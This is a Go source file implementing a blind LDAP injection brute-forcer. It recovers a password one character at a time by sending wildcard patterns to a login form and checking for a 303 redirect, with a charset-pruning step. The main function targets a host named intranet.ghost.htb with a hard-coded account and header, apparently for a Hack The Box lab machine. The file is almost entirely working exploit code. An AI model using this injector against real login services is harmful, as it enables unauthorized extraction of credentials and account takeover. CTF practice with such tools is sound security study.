package main

import (
	"fmt"
	"net/http"
	"strconv"
	"strings"
)

type Injector interface {
	Do(password string) (bool, error)
}

type LdapInjector struct {
	Client  Injector
	Charset string
}

func NewLdapInjector(client Injector) *LdapInjector {
	return &LdapInjector{
		Client:  client,
		Charset: CreateCharSet(),
	}
}

func (li *LdapInjector) TestCharacter(prefix string) (string, error) {
	for _, c := range li.Charset {
		if ok, err := li.Client.Do(fmt.Sprintf("%s%s*", prefix, string(c))); err != nil {
			return "", err
		} else if ok {
			return string(c), nil
		}
	}
	return "", nil
}

func (li *LdapInjector) BruteForce() (string, error) {
	var result string
	for {
		c, err := li.TestCharacter(result)
		if err != nil {
			return "", err
		}
		if c == "" {
			if ok, err := li.Client.Do(result); err != nil {
				return "", err
			} else if ok {
				return "", fmt.Errorf("Partial password found: %s", result)
			}
			break
		}
		result += c
	}
	return result, nil
}

func CreateCharSet() string {
	var charset string

	for c := 'a'; c <= 'z'; c++ {
		charset += string(c)
	}

	for i := range 10 {
		c := strconv.Itoa(i)
		charset += c
	}
	return charset
}

func (li *LdapInjector) PruneCharset() error {
	var newCharset string
	for _, c := range li.Charset {
		if ok, err := li.Client.Do(fmt.Sprintf("*%s*", string(c))); err != nil {
			return err
		} else if ok {
			newCharset += string(c)
		}
	}
	li.Charset = newCharset
	return nil
}

func main() {
	httpClient := NewNetHttpBruteImpl("POST", "http://intranet.ghost.htb:8008/login", "gitea_temp_principal", 303,
		map[string]string{
			"Content-Type": "application/x-www-form-urlencoded",
			"Next-Action":  "c47eb076ccac91d6f828b671795550fd5925940", // hard coded for ghost box
		},
	)
	c := NewLdapInjector(httpClient)

	pw, err := c.BruteForce()
	if err != nil {
		fmt.Println("Error:", err)
		return
	}
	fmt.Println("Password found:", pw)
}
